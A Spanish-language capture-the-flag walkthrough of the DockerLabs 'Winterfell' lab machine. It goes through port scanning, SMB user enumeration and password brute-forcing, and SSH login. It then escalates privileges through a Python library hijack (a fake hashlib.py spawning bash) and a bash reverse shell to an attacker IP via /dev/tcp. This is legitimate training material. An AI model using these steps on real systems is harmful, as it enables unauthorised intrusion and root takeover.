
## Máquina Vulnerable "Winterfell" de DockerLabs


Para realizar esta máquina vulnerable, se utilizó la plataforma DockerLabs, la cual ofrece una variedad de laboratorios prácticos para aprender sobre seguridad en contenedores y Docker. La máquina "Winterfell" es una de las opciones disponibles en esta plataforma.


## Fase de Reconocimiento

Antes de realizar una tarea de Pentesting, se debe hacer un reconocimiento de los activos disponibles en la red. Para esto, primero verificamos que la máquina esté encendida y qué servicios tiene corriendo, simplemente haciendo un ping:

```bash
ping 172.17.0.2 -c 3
```
![image](/static/images/winterfell/ping_winterfell.png)

## Escaneo de Puertos:

Luego de verificar que la máquina se encuentra encendida, se procede a realizar un escaneo de puertos para identificar los servicios que están corriendo en la máquina. Para esto, se utiliza la herramienta Nmap:

```bash
nmap -p- --open  172.17.0.2 -vvv -oG allPorts
```
Guardamos el resultado en formato grepeable para poder utilizar la herramienta que copia solo los puertos abiertos y luego realizar un escaneo más profundo.

![image](/static/images/winterfell/puertosabiertos.png)

Ahora escaneamos más a fondo solo los puertos abiertos de la máquina:

```bash
nmap -p22,80,139,445 -sCVT -Pn 172.17.0.2 -vvv -oN Targeted 
```
![image](/static/images/winterfell/nmap.png)

Para poder obtener más información, se utiliza la herramienta enum4linux, la cual nos permite obtener información de los usuarios, grupos, políticas de contraseñas, recursos compartidos, etc.

```bash
enum4linux -a 172.17.0.2
```
![image](/static/images/winterfell/enum4linux.png)

Como se puede observar, obtuvimos distintos usuarios, con los cuales se puede aplicar fuerza bruta para intentar obtener las contraseñas. Al no poder encontrarlas por fuerza bruta, se procede a buscar en la web haciendo fuzzing con la herramienta dirb, para intentar encontrar algún archivo o directorio interesante.

```bash
dirb http://172.17.0.2
```
Se encuentra un directorio llamado "dragon", donde se pueden observar datos interesantes que podrían ser contraseñas.

![image](/static/images/winterfell/contraseñas.png)

También se encuentra un recurso compartido llamado "shared", al cual se puede intentar acceder para ver si contiene información sensible. Al tener los usuarios reconocidos, se utiliza la herramienta hydra para intentar obtener las contraseñas de los usuarios obtenidos anteriormente.

```bash
smbclient -L 172.17.0.2 -N 
```
![image](/static/images/winterfell/shared.png)



## Explotación de Vulnerabilidades

Ahora intentamos acceder a SMB con el usuario "jon" y con las posibles contraseñas guardadas como payload (las guardé como users.txt porque pensé que podían ser usuarios, pero en realidad son contraseñas).

```bash
netexec smb 172.17.0.2 -U jon -P ./users.txt
```
![image](/static/images/winterfell/smb.png)

Una vez dentro del recurso compartido, con el comando:

```bash
smbclient //172.17.0.2/shared -U jon
```

Encontramos un archivo llamado "protección del reino", el cual descargamos y revisamos su contenido.

![image](/static/images/winterfell/quetiene.png)

![image](/static/images/winterfell/dentro.png)

Como se puede ver, hay un mensaje cifrado, el cual claramente es base64. Procedemos a ver qué dice:

![image](/static/images/winterfell/hijolanister.png)

Ahora usamos esta contraseña para entrar por SSH con el usuario "jon".

```bash
ssh jon@172.17.0.2
```

## Escalado de Privilegios

Vemos que existe un mensaje oculto para Jon, el cual leemos y dice lo siguiente:

![image](/static/images/winterfell/mensajejon.png)

Al usar el comando "sudo -l" vemos que podemos ejecutar un script de Python para encriptar un mensaje cualquiera como jon o aria. En este script se utiliza la librería hashlib, donde uno puede crear un archivo con ese nombre y poner un código malicioso para obtener una shell como aria. 

```python
import os
os.system("/bin/bash")
```
Luego se ejecuta el script:

```bash
sudo -u aria /usr/bin/python3 /home/jon/.mensaje.py
```
Y obtenemos la shell como aria, donde podemos ver la bandera de usuario.

![image](/static/images/winterfell/shellaria.png)

Ahora hacemos un "sudo -l" y vemos que podemos usar los siguientes comandos como daenerys:

![image](/static/images/winterfell/comandosdaenerys.png)


Buscando entre los comandos que podemos usar, vemos que daenerys tiene un mensaje para que aria lo pueda leer. 

![image](/static/images/winterfell/mensajedaenerys.png)

Una vez dentro del directorio de daenerys, usamos el comando "sudo -l" y vemos que se puede ejecutar una shell como root.

![image](/static/images/winterfell/shell.png)

Se edita el archivo .shell.sh con la IP de la máquina atacante y con el puerto 9991 nos ponemos en escucha. De esta forma podemos obtener una reverse shell como root.

El código que se utiliza es:

```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.100.119/9991 0>&1
```
De esta forma obtenemos acceso a la máquina víctima como root.

![image](/static/images/winterfell/ROOT.png)